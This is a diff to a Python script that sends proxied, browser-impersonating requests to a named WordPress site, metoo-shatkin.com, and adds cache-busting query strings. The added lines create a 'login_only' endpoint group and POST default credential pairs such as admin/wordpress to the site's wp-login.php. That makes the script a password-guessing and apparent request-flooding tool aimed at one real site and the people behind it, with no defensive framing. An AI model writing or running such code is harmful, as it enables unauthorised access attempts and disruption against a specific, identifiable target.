@@ -37,7 +37,9 @@ WP_LOGIN_POST_DATA = [
     {"log": "admin",      "pwd": "wordpress",    "wp-submit": "Log In", "testcookie": "1"},
 ]
 
-POST_ENDPOINTS = {}
+POST_ENDPOINTS = {
+    "/wp-login.php?redirect_to=https%3A%2F%2Fmetoo-shatkin.com%2Fwp-admin%2F&reauth=1": WP_LOGIN_POST_DATA,
+}
 
 ENDPOINT_SETS = {
     "feed":    ["/feed/", "/comments/feed/"],
@@ -63,10 +65,12 @@ ENDPOINT_SETS = {
     "shatkin_dynamic": ["/wp-login.php",
                         "/wp-login.php?action=lostpassword",
                         "/wp-admin/admin-ajax.php"],
+    "login_only": ["/wp-login.php?redirect_to=https%3A%2F%2Fmetoo-shatkin.com%2Fwp-admin%2F&reauth=1"],
     "shatkin_open": ["/feed/", "/comments/feed/", "/sitemap_index.xml",
                      "/page-sitemap.xml", "/category-sitemap.xml",
                      "/dentist-todd-shatkins-history-of-stalking/",
                      "/wp-login.php",
+                     "/wp-login.php?redirect_to=https%3A%2F%2Fmetoo-shatkin.com%2Fwp-admin%2F&reauth=1",
                      "/wp-admin/admin-ajax.php",
                      "/?p=1",
                      "/page/2/", "/page/3/", "/page/4/", "/page/5/",
@@ -140,14 +144,16 @@ def send_one(target, single_proxy, req_num):
         hdrs = {"User-Agent": ua}
         post_data = POST_ENDPOINTS.get(path)
         if post_data:
-            r = cffi.post(url, headers=hdrs, data=post_data,
-                          proxies=px, impersonate=imp, timeout=15)
+            data = random.choice(post_data) if isinstance(post_data, list) else post_data
+            login_hdrs = {**hdrs, "Cookie": "wordpress_test_cookie=WP+Cookie+check"}
+            r = cffi.post(url, headers=login_hdrs, data=data,
+                          proxies=px, impersonate=imp, timeout=30)
             method_tag = "POST"
         else:
             sep = "&" if "?" in path else "?"
             url = f"{url}{sep}_={int(time.time() * 1000) + random.randint(0, 999)}"
             r = cffi.get(url, headers=hdrs,
-                         proxies=px, impersonate=imp, timeout=15)
+                         proxies=px, impersonate=imp, timeout=30)
             method_tag = "GET"
 
         elapsed   = time.time() - t0
@@ -209,7 +215,7 @@ def main():
     ap.add_argument("--endpoints",   nargs="+",
                     choices=list(ENDPOINT_SETS.keys()) + ["all"],
                     default=["all"],
-                    help="endpoint groups: feed sitemap home shatkin shatkin_open shatkin_dynamic buffalo woo all")
+                    help="endpoint groups: feed sitemap home shatkin shatkin_open shatkin_dynamic login_only buffalo woo all")
     args = ap.parse_args()
 
     global _endpoints
